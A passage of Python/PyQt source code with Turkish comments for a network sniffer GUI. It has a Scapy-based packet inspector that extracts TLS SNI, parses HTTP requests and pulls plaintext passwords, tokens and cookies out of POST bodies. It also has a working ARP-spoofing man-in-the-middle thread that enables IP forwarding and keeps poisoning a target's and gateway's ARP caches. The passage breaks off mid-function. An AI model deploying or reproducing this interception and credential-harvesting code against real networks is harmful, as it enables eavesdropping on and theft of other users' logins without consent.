                item.setBackground(QColor("#1a3a1a"))
                item.setForeground(QColor("#00ff88"))
            # Domain varsa özel renk
            if col==7 and domain:
                item.setForeground(QColor("#00d4ff"))
            
            # GÜVENLİK SEVİYESİ RENKLEME (credential bulunduysa)
            if has_credential:
                item.setBackground(QColor("#3a0a0a"))
                if col==7:
                    item.setForeground(QColor("#ff4444"))
            elif security_level=='critical':
                item.setBackground(QColor("#3a0a0a"))
                if col==7:
                    item.setForeground(QColor("#ff4444"))
            elif security_level=='warning':
                item.setBackground(QColor("#2a1a0a"))
                if col==7:
                    item.setForeground(QColor("#ffaa00"))
            
            item.setData(Qt.ItemDataRole.UserRole,packet)
            self.packet_table.setItem(row,col,item)
        
        self.packet_table.scrollToBottom()
    
    def show_packet_menu(self,pos):
        """Paket sağ tık menüsü - IP İzle seçeneği"""
        row=self.packet_table.rowAt(pos.y())
        if row<0:return
        
        item=self.packet_table.item(row,0)
        if not item:return
        
        packet=item.data(Qt.ItemDataRole.UserRole)
        if not packet:return
        
        domain=getattr(packet,'domain','') or ''
        traffic_type=getattr(packet,'traffic_type','') or ''
        
        menu=QMenu(self)
        menu.setStyleSheet("""
            QMenu{background:#1a1a2e;color:white;border:2px solid #00ff88;border-radius:8px;padding:5px;}
            QMenu::item{padding:10px 20px;border-radius:4px;}
            QMenu::item:selected{background:#00ff88;color:#0a0a14;}
            QMenu::separator{height:2px;background:#0f3460;margin:5px 10px;}
        """)
        
        # Paket başlığı
        header_text=f"📦 Paket #{packet.no}"
        if domain:
            header_text+=f" - {domain}"
        menu.addAction(header_text).setEnabled(False)
        
        # Trafik tipi
        if traffic_type:
            menu.addAction(f"📊 {traffic_type}").setEnabled(False)
        
        menu.addSeparator()
        
        # Kaynak IP izle
        src_ip=packet.src_ip.split(':')[0] if ':' in packet.src_ip else packet.src_ip
        if src_ip and not src_ip.startswith(('00:','01:','FF:')):  # MAC değilse
            watch_src=menu.addAction(f"🎯 Kaynak İzle: {src_ip}")
            watch_src.triggered.connect(lambda:self.add_ip_to_watch(src_ip))
        
        # Hedef IP izle
        dst_ip=packet.dst_ip.split(':')[0] if ':' in packet.dst_ip else packet.dst_ip
        if dst_ip and not dst_ip.startswith(('00:','01:','FF:','224.','239.')):
            watch_dst=menu.addAction(f"🎯 Hedef İzle: {dst_ip}")
            watch_dst.triggered.connect(lambda:self.add_ip_to_watch(dst_ip))
        
        menu.addSeparator()
        
        # Filtre seçenekleri
        if domain:
            menu.addAction(f"🔍 Domain Filtrele: {domain[:20]}").triggered.connect(lambda:self.filter_input.setText(domain.split('.')[0] if '.' in domain else domain))
        if src_ip:
            menu.addAction(f"🔍 Kaynak Filtrele").triggered.connect(lambda:self.filter_input.setText(src_ip))
        if dst_ip:
            menu.addAction(f"🔍 Hedef Filtrele").triggered.connect(lambda:self.filter_input.setText(dst_ip))
        
        menu.addSeparator()
        
        # Kopyalama seçenekleri
        if domain:
            menu.addAction("📋 Domain Kopyala").triggered.connect(lambda:QApplication.clipboard().setText(domain))
        menu.addAction("📋 Hedef IP Kopyala").triggered.connect(lambda:QApplication.clipboard().setText(packet.dst_ip))
        menu.addAction("📋 Tüm Bilgiyi Kopyala").triggered.connect(lambda:QApplication.clipboard().setText(f"{packet.protocol} {packet.source} → {packet.destination} [{domain}] {packet.info}"))
        
        menu.exec(self.packet_table.viewport().mapToGlobal(pos))
    
    def add_ip_to_watch(self,ip):
        """IP'yi izleme listesine ekle"""
        if ip and ip not in self.watched_ips:
            self.watched_ips[ip]={
                'packets':[],'stats':{'tcp':0,'udp':0,'arp':0,'other':0},
                'first_seen':None,'last_seen':None,'ports':set(),'protos':set(),
                'domains':set(),'bytes':0,'http_count':0,'https_count':0
            }
            
            # Mevcut paketlerden bu IP'ye ait olanları ekle
            for pkt in self.packets:
                if ip in pkt.src_ip or ip in pkt.dst_ip:
                    self.watched_ips[ip]['packets'].append(pkt)
                    if pkt.src_port:self.watched_ips[ip]['ports'].add(pkt.src_port)
                    if pkt.dst_port:self.watched_ips[ip]['ports'].add(pkt.dst_port)
                    self.watched_ips[ip]['protos'].add(pkt.protocol)
                    domain=getattr(pkt,'domain','')
                    if domain:self.watched_ips[ip]['domains'].add(domain)
                    self.watched_ips[ip]['bytes']+=getattr(pkt,'length',0)
            
            self.update_watch_list()
            self.add_activity("🎯",f"IP izlemeye alındı: {ip}","Tüm trafik analiz edilecek")
            
            # Analiz panelini güncelle
            self.selected_watch_ip=ip
            self.update_ip_analysis(ip)
            
            # Filtre uygula
            self.filter_input.setText(ip)
    
    def on_packet_selected(self):
        rows=self.packet_table.selectedIndexes()
        if not rows:return
        item=self.packet_table.item(rows[0].row(),0)
        if not item:return
        packet=item.data(Qt.ItemDataRole.UserRole)
        if packet:self.show_packet_details(packet)
    
    def show_packet_details(self,packet):
        self.detail_tree.clear()
        
        # Ana bilgiler
        frame=QTreeWidgetItem(self.detail_tree,[f"📦 Paket #{packet.no}: {packet.length} bytes"])
        frame.setForeground(0,QColor("#00ff88"))
        QTreeWidgetItem(frame,[f"Zaman: {packet.timestamp:.4f} sn"])
        
        # Protokol
        proto=QTreeWidgetItem(self.detail_tree,[f"🔌 Protokol: {packet.protocol}"])
        proto.setForeground(0,QColor(PROTOCOL_COLORS.get(packet.protocol,'#888')))
        
        # ===== GÜVENLİK DURUMU =====
        security_status=getattr(packet,'security_status','❓ Bilinmiyor')
        can_see_data=getattr(packet,'can_see_data',False)
        has_credential=getattr(packet,'has_credential',False)
        
        sec_item=QTreeWidgetItem(self.detail_tree,[f"🔐 Güvenlik: {security_status}"])
        if "Şifreli" in security_status:
            sec_item.setForeground(0,QColor("#00ff88"))
            # Alt bilgi ekle
            QTreeWidgetItem(sec_item,[f"✅ Veriler şifrelidir - Kullanıcı adı/şifre GÖRÜLEMEZ"])
        elif "AÇIK" in security_status or "TEHLİKE" in security_status:
            sec_item.setForeground(0,QColor("#ff6600"))
            QTreeWidgetItem(sec_item,[f"⚠️ Veriler ŞİFRESİZ - Kullanıcı adı/şifre GÖRÜLEBİLİR!"])
        elif "ŞİFRE" in security_status:
            sec_item.setForeground(0,QColor("#ff0000"))
            QTreeWidgetItem(sec_item,[f"🚨 CREDENTIAL TESPİT EDİLDİ!"])
        else:
            sec_item.setForeground(0,QColor("#888"))
        
        # Credential bulunduysa göster
        credential_data=getattr(packet,'credential_data',None)
        if credential_data:
            cred_item=QTreeWidgetItem(self.detail_tree,[f"🚨 YAKALANAN VERİ:"])
            cred_item.setForeground(0,QColor("#ff0000"))
            for key,val in credential_data.items():
                child=QTreeWidgetItem(cred_item,[f"  {key}: {val}"])
                child.setForeground(0,QColor("#ff6666"))
        
        # Domain varsa göster
        domain=getattr(packet,'domain','')
        if domain:
            dom=QTreeWidgetItem(self.detail_tree,[f"🌐 Domain/Servis: {domain}"])
            dom.setForeground(0,QColor("#00d4ff"))
        
        # Trafik tipi
        traffic_type=getattr(packet,'traffic_type','')
        if traffic_type:
            traffic=QTreeWidgetItem(self.detail_tree,[f"📊 Trafik Tipi: {traffic_type}"])
            traffic.setForeground(0,QColor("#f39c12"))
        
        # Kaynak
        src=QTreeWidgetItem(self.detail_tree,[f"📤 Kaynak: {packet.source}"])
        src.setForeground(0,QColor("#5294e2"))
        
        # Hedef
        dst=QTreeWidgetItem(self.detail_tree,[f"📥 Hedef: {packet.destination}"])
        dst.setForeground(0,QColor("#e74c3c"))
        
        # Detaylı bilgi
        info=QTreeWidgetItem(self.detail_tree,[f"ℹ️ {packet.info}"])
        info.setForeground(0,QColor("#888"))
        
        self.detail_tree.expandAll()
    
    def add_activity(self,icon,text,details=""):
        now=datetime.now().strftime("%H:%M:%S.%f")[:-3]
        
        # Detaylı mesaj oluştur
        if details:
            full_text=f"{icon} [{now}] {text}\n      └─ {details}"
        else:
            full_text=f"{icon} [{now}] {text}"
        
        item=QListWidgetItem(full_text)
        
        # Renk ve stil
        if "🟢" in icon or "başlat" in text.lower():
            item.setForeground(QColor("#00ff88"))
            item.setBackground(QColor("#0a2a0a"))
        elif "🔴" in icon or "durdur" in text.lower():
            item.setForeground(QColor("#e74c3c"))
            item.setBackground(QColor("#2a0a0a"))
        elif "🎯" in icon:
            item.setForeground(QColor("#00d4ff"))
            item.setBackground(QColor("#0a1a2a"))
        elif "📦" in icon:
            item.setForeground(QColor("#f39c12"))
        elif "🔧" in icon:
            item.setForeground(QColor("#9b59b6"))
        elif "🌐" in icon or "TCP" in text or "HTTP" in text:
            item.setForeground(QColor("#5294e2"))
        elif "📡" in icon or "UDP" in text or "DNS" in text:
            item.setForeground(QColor("#73d216"))
        elif "🔶" in icon or "ARP" in text:
            item.setForeground(QColor("#f5c211"))
        else:
            item.setForeground(QColor("#aaa"))
        
        self.activity_list.insertItem(0,item)
        
        # Max 100 kayıt tut
        while self.activity_list.count()>100:
            self.activity_list.takeItem(self.activity_list.count()-1)
    
    def update_stats(self):
        """İstatistikleri güncelle"""
        tcp_count=sum(1 for p in self.packets if p.protocol.upper() in ['TCP','HTTP','HTTPS','SSH','FTP','SMTP'])
        udp_count=sum(1 for p in self.packets if p.protocol.upper() in ['UDP','DNS'])
        arp_count=sum(1 for p in self.packets if p.protocol.upper()=='ARP')
        
        self.stat_total.setText(f"📦 Toplam: {len(self.packets)}")
        self.stat_tcp.setText(f"🔵 TCP: {tcp_count}")
        self.stat_udp.setText(f"🟢 UDP: {udp_count}")
        self.stat_arp.setText(f"🟡 ARP: {arp_count}")
    
    def apply_filter(self):
        filter_text=self.filter_input.text().lower().strip()
        self.packet_table.setRowCount(0)
        
        for packet in self.packets:
            if self.matches_filter(packet,filter_text):
                self.add_packet_to_table(packet)
    
    def matches_filter(self,packet,filter_text=None):
        if filter_text is None:
            filter_text=self.filter_input.text().lower().strip()
        
        if not filter_text:return True
        
        # Protokol
        if filter_text in ['tcp','udp','arp','icmp','http','https','dns']:
            return filter_text in packet.protocol.lower()
        
        # IP veya genel arama - domain dahil
        search=f"{packet.src_ip} {packet.dst_ip} {packet.protocol} {packet.info}".lower()
        if hasattr(packet,'domain') and packet.domain:
            search+=f" {packet.domain}".lower()
        return filter_text in search
    
    # Uyumluluk
    def get_targets(self):return self.targets
    def load_targets(self,data):self.targets=data


# ============= GELİŞMİŞ AĞ ANALİZ MOTORU =============

# Bilinen servisler ve şirketler
KNOWN_DOMAINS={
    # Google
    '142.250':'Google','172.217':'Google','216.58':'Google','74.125':'Google','173.194':'Google',
    '172.253':'Google','142.251':'Google','209.85':'Google','64.233':'Google',
    # Microsoft
    '13.107':'Microsoft','52.':'Microsoft Azure','40.':'Microsoft Azure','20.':'Microsoft',
    '104.215':'Microsoft','23.':'Microsoft/Akamai','65.55':'Microsoft','131.253':'Microsoft',
    # Cloudflare
    '104.16':'Cloudflare','104.17':'Cloudflare','104.18':'Cloudflare','104.19':'Cloudflare',
    '104.20':'Cloudflare','104.21':'Cloudflare','104.22':'Cloudflare','104.23':'Cloudflare',
    '104.24':'Cloudflare','104.25':'Cloudflare','104.26':'Cloudflare','104.27':'Cloudflare',
    '1.1.1':'Cloudflare DNS','1.0.0':'Cloudflare DNS',
    # Amazon
    '54.':'Amazon AWS','52.':'Amazon AWS','3.':'Amazon AWS','18.':'Amazon AWS',
    '34.':'Amazon AWS','35.':'Amazon AWS','99.':'Amazon AWS',
    # Facebook/Meta
    '157.240':'Facebook/Meta','31.13':'Facebook/Meta','179.60':'Facebook/Meta',
    '66.220':'Facebook/Meta','69.171':'Facebook/Meta','173.252':'Facebook/Meta',
    # Akamai
    '23.':'Akamai','104.':'Akamai','95.100':'Akamai','2.16':'Akamai','2.17':'Akamai',
    # Apple
    '17.':'Apple','63.':'Apple',
    # Netflix
    '54.246':'Netflix','52.94':'Netflix','108.175':'Netflix','198.38':'Netflix',
    '198.45':'Netflix','23.246':'Netflix','37.77':'Netflix','45.57':'Netflix',
    # Twitter/X
    '104.244':'Twitter/X','199.16':'Twitter/X','199.59':'Twitter/X',
    # DNS Servers
    '8.8.8':'Google DNS','8.8.4':'Google DNS','208.67':'OpenDNS','9.9.9':'Quad9 DNS',
    # Gaming
    '185.60':'Steam/Valve','103.10':'Steam/Valve',
    # Telegram
    '149.154':'Telegram','91.108':'Telegram',
    # WhatsApp
    '157.240':'WhatsApp (Meta)',
    # YouTube (Google)
    '172.217':'YouTube','142.250':'YouTube','216.58':'YouTube',
}

# Trafik tipi belirleme
TRAFFIC_TYPES={
    443:'🔒 HTTPS Web',80:'🌐 HTTP Web',8080:'🌐 HTTP Proxy',8443:'🔒 HTTPS Alt',
    53:'📡 DNS Sorgusu',853:'🔒 DNS over TLS',
    22:'🖥️ SSH Bağlantı',23:'⚠️ Telnet',21:'📁 FTP',20:'📁 FTP Data',
    25:'📧 SMTP Mail',465:'📧 SMTPS',587:'📧 SMTP Submit',
    110:'📧 POP3',995:'📧 POP3S',143:'📧 IMAP',993:'📧 IMAPS',
    3389:'🖥️ RDP Uzak Masa',5900:'🖥️ VNC',5901:'🖥️ VNC',5902:'🖥️ VNC',
    3306:'🗄️ MySQL DB',5432:'🗄️ PostgreSQL',1433:'🗄️ MSSQL',27017:'🗄️ MongoDB',6379:'🗄️ Redis',
    445:'📂 SMB Paylaşım',139:'📂 NetBIOS',137:'📂 NetBIOS',138:'📂 NetBIOS',
    1194:'🔐 OpenVPN',500:'🔐 IPSec VPN',4500:'🔐 IPSec NAT',1701:'🔐 L2TP',
    1723:'🔐 PPTP VPN',
    6667:'💬 IRC',6697:'💬 IRC SSL',
    5222:'💬 XMPP/Jabber',5223:'💬 XMPP SSL',
    1935:'📺 RTMP Stream',554:'📺 RTSP Stream',
    9418:'📦 Git',
    123:'⏰ NTP Zaman',161:'📊 SNMP',162:'📊 SNMP Trap',
    67:'🌐 DHCP',68:'🌐 DHCP',
    8888:'🔧 Alt HTTP',9000:'🔧 Alt HTTP',
    27015:'🎮 Steam Game',27016:'🎮 Steam Game',27017:'🎮 Steam Game',
    25565:'🎮 Minecraft',
    5938:'🖥️ TeamViewer',
    3478:'📞 STUN/TURN',3479:'📞 STUN/TURN',
    5060:'📞 SIP VoIP',5061:'📞 SIP TLS',
}

# Şifre alanları tespiti için pattern'ler
CREDENTIAL_PATTERNS=[
    'password','passwd','pass','pwd','secret','token','auth','login','user','username',
    'email','mail','credential','key','api_key','apikey','session','cookie',
    'sifre','parola','kullanici','oturum'
]

# Scapy kontrolü
SCAPY_AVAILABLE=False
try:
    from scapy.all import sniff,IP,TCP,UDP,DNS,DNSQR,DNSRR,Raw,ARP,Ether,conf,getmacbyip,send,srp
    conf.verb=0  # Sessiz mod
    SCAPY_AVAILABLE=True
except ImportError:
    pass


class ARPSpoofThread(QThread):
    """ARP Spoofing (Man-in-the-Middle) Thread"""
    status_update=pyqtSignal(str)
    error_occurred=pyqtSignal(str)
    
    def __init__(self,target_ip,gateway_ip):
        super().__init__()
        self.target_ip=target_ip
        self.gateway_ip=gateway_ip
        self.running=True
        self.target_mac=None
        self.gateway_mac=None
        self.my_mac=None
        
    def stop(self):
        """ARP Spoofing durdur ve tabloları düzelt"""
        self.running=False
        self.restore_arp()
    
    def get_mac(self,ip):
        """IP adresinden MAC adresi al"""
        try:
            # ARP request gönder
            arp_request=ARP(pdst=ip)
            broadcast=Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast=broadcast/arp_request
            answered_list=srp(arp_request_broadcast,timeout=2,verbose=False)[0]
            
            if answered_list:
                return answered_list[0][1].hwsrc
            return None
        except Exception as e:
            return None
    
    def spoof(self,target_ip,spoof_ip,target_mac):
        """ARP paketi gönder - target'a kendimizi spoof_ip olarak tanıt"""
        try:
            packet=ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=spoof_ip)
            send(packet,verbose=False)
        except Exception as e:
            pass
    
    def restore_arp(self):
        """ARP tablolarını düzelt"""
        try:
            if self.target_mac and self.gateway_mac:
                self.status_update.emit("🔄 ARP tabloları düzeltiliyor...")
                
                # Target'a gerçek gateway MAC'ini gönder
                packet1=ARP(op=2,pdst=self.target_ip,hwdst=self.target_mac,
                           psrc=self.gateway_ip,hwsrc=self.gateway_mac)
                send(packet1,count=4,verbose=False)
                
                # Gateway'e gerçek target MAC'ini gönder
                packet2=ARP(op=2,pdst=self.gateway_ip,hwdst=self.gateway_mac,
                           psrc=self.target_ip,hwsrc=self.target_mac)
                send(packet2,count=4,verbose=False)
                
                self.status_update.emit("✅ ARP tabloları düzeltildi")
        except Exception as e:
            self.error_occurred.emit(f"ARP düzeltme hatası: {str(e)[:30]}")
    
    def enable_ip_forwarding(self):
        """IP forwarding aç - paketler iletilsin"""
        try:
            if platform.system()=="Windows":
                # Windows - Registry ile
                import winreg
                key=winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                    r"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters",
                    0,winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key,"IPEnableRouter",0,winreg.REG_DWORD,1)
                winreg.CloseKey(key)
                self.status_update.emit("✅ IP Forwarding açıldı (Windows)")
            else:
                # Linux
                with open("/proc/sys/net/ipv4/ip_forward","w") as f:
                    f.write("1")
                self.status_update.emit("✅ IP Forwarding açıldı (Linux)")
            return True
        except Exception as e:
            self.status_update.emit(f"⚠️ IP Forwarding açılamadı - Yönetici yetkisi gerekli")
            return False
    
    def run(self):
        """ARP Spoofing döngüsü"""
        try:
            self.status_update.emit("🔍 MAC adresleri alınıyor...")
            
            # MAC adreslerini al
            self.target_mac=self.get_mac(self.target_ip)
            if not self.target_mac:
                self.error_occurred.emit(f"Hedef MAC alınamadı: {self.target_ip}")
                return
            
            self.gateway_mac=self.get_mac(self.gateway_ip)
            if not self.gateway_mac:
                self.error_occurred.emit(f"Gateway MAC alınamadı: {self.gateway_ip}")
                return
            
            self.status_update.emit(f"✅ Hedef: {self.target_mac}")
            
            # IP Forwarding aç
            self.enable_ip_forwarding()
            
            self.status_update.emit("🔴 MITM Aktif - Paketler yönlendiriliyor")
            
            # Spoofing döngüsü
            packet_count=0
            while self.running:
                try:
                    # Target'a: "Ben gateway'im" de
                    self.spoof(self.target_ip,self.gateway_ip,self.target_mac)
                    
                    # Gateway'e: "Ben target'ım" de
                    self.spoof(self.gateway_ip,self.target_ip,self.gateway_mac)
                    
                    packet_count+=2
                    
                    if packet_count%20==0:
                        self.status_update.emit(f"🔴 MITM Aktif - {packet_count} ARP paketi")
                    
                    time.sleep(1)  # 1 saniyede bir ARP gönder
                except Exception as e:
                    if self.running:
                        time.sleep(1)
                        continue
                    break
            
            # Durduruldu - tabloları düzelt
            self.restore_arp()
            
        except Exception as e:
            self.error_occurred.emit(f"ARP Spoof hatası: {str(e)[:50]}")
            self.restore_arp()


class DeepPacketThread(QThread):
    """Deep Packet Inspection - Gerçek Zamanlı Paket Yakalama"""
    packet_captured=pyqtSignal(object)
    security_alert=pyqtSignal(dict)
    debug_info=pyqtSignal(str)
    dns_resolved=pyqtSignal(str,str)  # IP, Domain
    http_request=pyqtSignal(dict)  # URL, method, headers
    credential_found=pyqtSignal(dict)  # GÜVENLİK UYARISI
    
    def __init__(self,interface=None):
        super().__init__()
        self.running=True
        self.packet_no=0
        self.interface=interface
        self.start_time=time.time()
        self.dns_cache={}
        self.seen_connections=set()
        self.http_sessions={}
        
    def stop(self):
        self.running=False
    
    def extract_sni(self,payload):
        """TLS Client Hello'dan SNI (Server Name Indication) çıkar"""
        try:
            if len(payload)<43:return None
            # TLS Handshake (0x16) ve Client Hello (0x01)
            if payload[0]!=0x16:return None
            
            # TLS version check
            if payload[1:3] not in [b'\x03\x01',b'\x03\x03',b'\x03\x02']:return None
            
            # Skip to extensions
            session_id_len=payload[43]
            pos=44+session_id_len
            
            if pos+2>len(payload):return None
            cipher_len=int.from_bytes(payload[pos:pos+2],'big')
            pos+=2+cipher_len
            
            if pos+1>len(payload):return None
            comp_len=payload[pos]
            pos+=1+comp_len
            
            if pos+2>len(payload):return None
            ext_len=int.from_bytes(payload[pos:pos+2],'big')
            pos+=2
            
            # Parse extensions
            while pos<len(payload)-4:
                ext_type=int.from_bytes(payload[pos:pos+2],'big')
                ext_len=int.from_bytes(payload[pos+2:pos+4],'big')
                pos+=4
                
                if ext_type==0:  # SNI extension
                    if pos+5<=len(payload):
                        name_len=int.from_bytes(payload[pos+3:pos+5],'big')
                        if pos+5+name_len<=len(payload):
                            return payload[pos+5:pos+5+name_len].decode('utf-8',errors='ignore')
                pos+=ext_len
        except:
            pass
        return None
    
    def parse_http_request(self,payload):
        """HTTP isteğini parse et"""
        try:
            data=payload.decode('utf-8',errors='ignore')
            lines=data.split('\r\n')
            if not lines:return None
            
            # İlk satır: GET /path HTTP/1.1
            first_line=lines[0]
            parts=first_line.split(' ')
            if len(parts)<2:return None
            
            method=parts[0]
            if method not in ['GET','POST','PUT','DELETE','HEAD','OPTIONS','PATCH']:
                return None
            
            path=parts[1] if len(parts)>1 else '/'
            
            # Headers
            headers={}
            host=''
            body_start=0
            for i,line in enumerate(lines[1:],1):
                if ':' in line:
                    key,val=line.split(':',1)
                    headers[key.strip().lower()]=val.strip()
                    if key.lower()=='host':
                        host=val.strip()
                elif line=='':
                    body_start=i+1
                    break
            
            # Body (POST için)
            body=''
            if body_start>0 and body_start<len(lines):
                body='\r\n'.join(lines[body_start:])
            
            return {
                'method':method,
                'path':path,
                'host':host,
                'url':f"http://{host}{path}" if host else path,
                'headers':headers,
                'body':body
            }
        except:
            return None
    
    def check_credentials(self,http_data):
        """HTTP verisinde credential kontrolü"""
        alerts=[]
        
        # Body'de şifre alanı var mı?
        body=http_data.get('body','').lower()
        url=http_data.get('url','')
        
        for pattern in CREDENTIAL_PATTERNS:
            if pattern in body:
                # Değeri bulmaya çalış
                import re
                # password=xxx veya "password":"xxx" formatları
                matches=re.findall(rf'{pattern}[=:"\']?\s*[=:]\s*["\']?([^&\s"\'<>]+)',body,re.IGNORECASE)
                for match in matches:
                    if len(match)>2 and match not in ['true','false','null','undefined']:
                        alerts.append({
                            'type':'CREDENTIAL_EXPOSED',
                            'severity':'CRITICAL',
                            'field':pattern,
                            'value':match[:20]+'...' if len(match)>20 else match,
                            'url':url,
                            'message':f"⚠️ ŞİFRELENMEMİŞ {pattern.upper()} TESPİT EDİLDİ!"
                        })
        
        return alerts
    
    def packet_callback(self,pkt):
        """Scapy paket callback"""
        if not self.running:return
        
        try:
            self.packet_no+=1
            elapsed=time.time()-self.start_time
            
            # IP paketi mi?
            if not pkt.haslayer(IP):
                # ARP kontrolü
                if pkt.haslayer(ARP):
                    arp=pkt[ARP]
                    self.emit_packet(
                        elapsed,'ARP',arp.psrc,'00:00:00:00:00:00',
                        arp.pdst,'00:00:00:00:00:00',0,0,42,
                        f"🔶 ARP: {arp.psrc} → {arp.hwsrc}",
                        domain=None,security_level='info',
                        has_credential=False,credential_data=None
                    )
                return
            
            ip=pkt[IP]
            src_ip=ip.src
            dst_ip=ip.dst
            protocol='IP'
            src_port=0
            dst_port=0
            info=''
            domain=None
            security_level='info'
            has_credential=False
            credential_data=None
            
            # TCP
            if pkt.haslayer(TCP):
                tcp=pkt[TCP]
                src_port=tcp.sport
                dst_port=tcp.dport
                protocol='TCP'
                
                # Payload var mı?
                if pkt.haslayer(Raw):
                    payload=bytes(pkt[Raw].load)
                    
                    # HTTPS/TLS - SNI çıkar
                    if dst_port==443 or src_port==443:
                        sni=self.extract_sni(payload)
                        if sni:
                            domain=sni
                            self.dns_cache[dst_ip]=sni
                            info=f"🔒 HTTPS → {sni}"
                            protocol='HTTPS'
                            self.dns_resolved.emit(dst_ip,sni)
                    
                    # HTTP - Tam analiz
                    elif dst_port==80 or src_port==80 or dst_port==8080:
                        http_data=self.parse_http_request(payload)
                        if http_data:
                            protocol='HTTP'
                            domain=http_data.get('host','')
                            url=http_data.get('url','')
                            method=http_data.get('method','')
                            
                            info=f"🌐 {method} {url[:50]}"
                            security_level='warning'  # HTTP şifresiz
                            
                            self.http_request.emit(http_data)
                            
                            # Credential kontrolü
                            credential_data=None
                            has_credential=False
                            if method=='POST':
                                creds=self.check_credentials(http_data)
                                for cred in creds:
                                    security_level='critical'
                                    has_credential=True
                                    credential_data=cred
                                    info=f"🚨 ŞİFRE TESPİT: {cred.get('field','')}={cred.get('value','***')}"
                                    self.credential_found.emit(cred)
                                    self.security_alert.emit(cred)
                
                # Bağlantı bilgisi
                if not info:
                    service=KNOWN_SERVICES.get(dst_port,KNOWN_SERVICES.get(src_port,''))
                    traffic=TRAFFIC_TYPES.get(dst_port,'')
                    info=f"TCP :{src_port}→{dst_ip}:{dst_port}"
                    if service:info+=f" [{service}]"
                    if traffic:info+=f" {traffic}"
                    protocol=service if service in PROTOCOL_COLORS else 'TCP'
            
            # UDP
            elif pkt.haslayer(UDP):
                udp=pkt[UDP]
                src_port=udp.sport
                dst_port=udp.dport
                protocol='UDP'
                
                # DNS
                if pkt.haslayer(DNS):
                    dns=pkt[DNS]
                    protocol='DNS'
                    
                    # DNS Query
                    if dns.qr==0 and pkt.haslayer(DNSQR):
                        qname=pkt[DNSQR].qname.decode('utf-8',errors='ignore').rstrip('.')
                        domain=qname
                        info=f"📡 DNS Sorgusu: {qname}"
                    
                    # DNS Response
                    elif dns.qr==1:
                        if pkt.haslayer(DNSQR):
                            qname=pkt[DNSQR].qname.decode('utf-8',errors='ignore').rstrip('.')
                            domain=qname
                            
                            # A kayıtlarını cache'le
                            if pkt.haslayer(DNSRR):
                                for i in range(dns.ancount):
                                    try:
                                        rr=dns.an[i]
                                        if rr.type==1:  # A record
                                            resolved_ip=rr.rdata
                                            self.dns_cache[resolved_ip]=qname
                                            self.dns_resolved.emit(resolved_ip,qname)
                                    except:pass
                            
                            info=f"📡 DNS Yanıt: {qname}"
                else:
                    service=KNOWN_SERVICES.get(dst_port,'')
                    info=f"UDP :{src_port}→{dst_ip}:{dst_port}"
                    if service:info+=f" [{service}]"
            
            # Domain cache'den çözümle
            if not domain:
                domain=self.dns_cache.get(dst_ip) or self.resolve_ip_static(dst_ip)
            
            # Paketi emit et
            self.emit_packet(
                elapsed,protocol,src_ip,'',dst_ip,'',
                src_port,dst_port,len(pkt),info,
                domain=domain,security_level=security_level,
                has_credential=has_credential,credential_data=credential_data
            )
            
        except Exception as e:
            pass
    
    def resolve_ip_static(self,ip):
        """Bilinen IP'leri çözümle"""
        for prefix,name in KNOWN_DOMAINS.items():
            if ip.startswith(prefix):
                return name
        return None
    
    def emit_packet(self,timestamp,protocol,src_ip,src_mac,dst_ip,dst_mac,
                    src_port,dst_port,length,info,domain=None,security_level='info',
                    has_credential=False,credential_data=None):
        """Paket sinyali gönder"""
        packet=PacketData(
            no=self.packet_no,
            timestamp=timestamp,
            src_ip=src_ip,
            src_port=src_port,
            dst_ip=dst_ip,
            dst_port=dst_port,
            protocol=protocol,
            length=length,
            info=info
        )
        packet.domain=domain
        packet.security_level=security_level
        packet.traffic_type=TRAFFIC_TYPES.get(dst_port,'')
        packet.has_credential=has_credential
        packet.credential_data=credential_data
        
        if self.running:
            self.packet_captured.emit(packet)
    
    def run(self):
        if not SCAPY_AVAILABLE:
            self.debug_info.emit("⚠️ Scapy yüklü değil! Deep Packet Inspection için 'pip install scapy' çalıştırın")
            self.debug_info.emit("💡 Windows için Npcap kurulumu da gerekli: https://npcap.com")
            self.debug_info.emit("🔄 Basit mod ile devam ediliyor...")
            self.run_simple_mode()
            return
        
        self.debug_info.emit("🚀 Deep Packet Inspection başlatıldı...")
        self.debug_info.emit("📡 Scapy ile gerçek zamanlı paket yakalama aktif")
        
        try:
            # Sniff döngüsü - timeout ile sürekli yenile
            while self.running:
                try:
                    sniff(
                        prn=self.packet_callback,
                        store=0,
                        timeout=2,  # 2 saniyede bir yenile
                        stop_filter=lambda x:not self.running,
                        iface=self.interface
                    )
                except Exception as e:
                    if self.running:
                        time.sleep(0.5)
                        continue
                    break
        except PermissionError:
            self.debug_info.emit("⚠️ Yönetici yetkisi gerekli! Programı yönetici olarak çalıştırın")
            self.run_simple_mode()
        except Exception as e:
            self.debug_info.emit(f"⚠️ Scapy hatası: {str(e)[:50]}")
            self.debug_info.emit("🔄 Basit mod ile devam ediliyor...")
            self.run_simple_mode()
    
    def run_simple_mode(self):
        """Scapy yoksa basit mod - netstat + DNS cache"""
        while self.running:
            try:
                elapsed=time.time()-self.start_time
                
                # DNS cache yükle
                if platform.system()=="Windows":
                    self.load_windows_dns_cache()
                
                # Netstat ile bağlantıları al
                connections=self.get_netstat_connections()
                
                for conn in connections:
                    if not self.running:break
                    
                    key=f"{conn['proto']}:{conn['remote_ip']}:{conn['remote_port']}"
                    if key in self.seen_connections:continue
                    self.seen_connections.add(key)
                    
                    self.packet_no+=1
                    
                    domain=self.dns_cache.get(conn['remote_ip']) or self.resolve_ip_static(conn['remote_ip'])
                    
                    rport=int(conn['remote_port']) if conn['remote_port'].isdigit() else 0
                    lport=int(conn['local_port']) if conn['local_port'].isdigit() else 0
                    
                    service=KNOWN_SERVICES.get(rport,KNOWN_SERVICES.get(lport,''))
                    traffic=TRAFFIC_TYPES.get(rport,'')
                    
                    info=f"{conn['proto']} :{conn['local_port']}→{conn['remote_ip']}:{conn['remote_port']}"
                    if domain:info+=f" [{domain}]"
                    if traffic:info+=f" {traffic}"
                    if conn['state']:info+=f" {conn['state']}"
                    
                    protocol=service if service in PROTOCOL_COLORS else conn['proto']
                    
                    self.emit_packet(
                        elapsed,protocol,conn['local_ip'],'',
                        conn['remote_ip'],'',lport,rport,
                        random.randint(40,1500),info,domain=domain
                    )
                
            except:pass
            
            for _ in range(5):
                if not self.running:break
                time.sleep(0.1)
    
    def load_windows_dns_cache(self):
        """Windows DNS cache'i yükle"""
        try:
            startupinfo=subprocess.STARTUPINFO()
